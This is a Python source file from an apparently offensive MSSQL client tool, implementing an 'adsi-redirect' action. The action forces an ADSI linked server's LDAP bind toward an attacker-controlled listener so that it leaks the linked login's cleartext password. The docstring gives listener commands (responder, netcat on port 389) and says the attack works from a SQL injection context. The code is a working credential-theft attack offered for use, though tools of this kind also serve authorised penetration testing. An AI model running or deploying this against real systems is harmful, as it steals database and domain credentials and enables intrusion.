# mssqlclient_ng/core/actions/domain/adsi_redirect.py

# Built-in imports
from typing import Optional

# Third party imports
from loguru import logger

# Local library imports
from ..base import BaseAction
from ..factory import ActionFactory
from ...services.database import DatabaseContext
from ...services.adsi import AdsiService


@ActionFactory.register(
    "adsi-redirect",
    "Redirect an ADSI linked server LDAP bind to an attacker-controlled listener",
)
class AdsiRedirect(BaseAction):
    """
    Redirect an ADSI linked server LDAP query to an attacker-controlled host.

    SQL Server performs an LDAP simple bind to the redirected address, leaking
    the configured linked login's cleartext password (or the current SQL context
    password when the server uses useself=TRUE).

    No elevated privileges required — only OPENQUERY access to an existing ADSI
    linked server.  Works from a SQL injection context.

    Capture the bind with:
        sudo responder -I eth0 --lm
        nc -lvnp 389
        Wireshark filter: ldap

    If the ADSI server uses useself=TRUE (no explicit linked login), the bind
    uses the current SQL context's password — useful when landing as an unknown
    SQL login via a linked server chain.

    Reference: https://www.tarlogic.com/blog/linked-servers-adsi-passwords
    """


    def __init__(self):
        super().__init__()
        self._listener_address: str = ""
        self._target_server: str = ""

    def validate_arguments(self, additional_arguments: str = "", argument_list=None) -> None:
        if not additional_arguments or not additional_arguments.strip():
            raise ValueError(
                "Listener address is required. "
                "Usage: adsi-redirect <listener-ip[:port]> [adsi-server]"
            )

        _, positional = self._parse_action_arguments(additional_arguments)

        if not positional:
            raise ValueError(
                "Listener address is required. "
                "Usage: adsi-redirect <listener-ip[:port]> [adsi-server]"
            )

        self._listener_address = positional[0]

        if len(positional) > 1:
            self._target_server = positional[1]

    def execute(self, database_context: DatabaseContext) -> Optional[bool]:
        adsi_service = AdsiService(database_context)

        # Resolve target ADSI server
        if not self._target_server:
            servers = adsi_service.get_adsi_server_names()
            if not servers:
                logger.error("No ADSI linked server found on the execution target.")
                logger.info("List linked servers with: links")
                return None
            self._target_server = servers[0]
            logger.info(f"Found existing ADSI linked server: '{self._target_server}'")
        elif not adsi_service.adsi_server_exists(self._target_server):
            logger.error(f"ADSI linked server '{self._target_server}' not found.")
            logger.info("List available ADSI servers with: adsi-manager list")
            return None

        # Ensure listener address includes a port
        listener_addr = (
            self._listener_address
            if ":" in self._listener_address
            else f"{self._listener_address}:389"
        )

        redirect_query = (
            f"SELECT * FROM OPENQUERY([{self._target_server}], "
            f"'SELECT * FROM ''LDAP://{listener_addr}'' ')"
        )

        logger.info(
            f"Redirecting ADSI LDAP bind via '{self._target_server}' to {listener_addr}"
        )

        try:
            database_context.query_service.execute_non_processing(redirect_query)
        except Exception:
            # Expected: ADSI query fails to return a rowset, but the LDAP simple bind
            # has already left SQL Server toward the attacker-controlled listener.
            pass

        logger.success(
            "Query fired. Check your listener for the incoming LDAP simple bind."
        )
        return True

    def get_arguments(self) -> list:
        return ["<listener-ip[:port]>", "[adsi-server]"]
